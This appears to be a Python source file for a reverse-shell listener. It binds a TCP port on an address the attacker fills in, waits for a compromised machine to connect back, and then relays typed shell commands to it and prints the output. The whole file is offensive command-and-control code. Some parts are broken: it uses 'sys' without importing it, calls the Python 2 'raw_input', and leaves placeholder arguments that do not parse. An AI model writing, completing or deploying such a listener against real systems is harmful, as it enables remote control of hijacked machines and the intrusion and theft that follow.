import socket
import signal
import os
import subprocess

cwd = ''

class Listener:
    def __init__(self,ip,port):
        try:
            self.ip = ip
            self.port = port
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.s.bind((ip, port))
            self.s.listen(0)
            print('[+] Listening for incoming connections...')
            self.connection, address = self.s.accept()
            print("[+] Connected")
            self.getPWD()
            self.commands()
        except Exception as e:
            print('[-] Error while connecting')

    def getPWD(self):
        global cwd
        pwd = 'pwd'
        self.connection.send(pwd.encode())
        cwd = self.connection.recv(1024)
        cwd = cwd.decode()

    def commands(self):
        global cwd
        isDone = False
        while isDone == False:
            try:
                result = input(cwd.rstrip() + '$ ')
                if result == 'quit':
                    self.connection.close()
                    print("[+] Quitting...")
                    isDone = True
                else:
                    self.connection.send(result.encode())
                    output = self.connection.recv(1024)
                    print(output.decode())
                    self.getPWD()
            except:
                pass

def exit_gracefully(signum, frame):
    # restore the original signal handler as otherwise evil things will happen
    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
    signal.signal(signal.SIGINT, original_sigint)

    try:
        if raw_input("\nReally quit? (y/n)> ").lower().startswith('y'):
            sys.exit(1)

    except KeyboardInterrupt:
        print("[+] Quitting")
        sys.exit(1)

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    listener = Listener([YOUR IP ADDRESS HERE],[PORT NUMBER])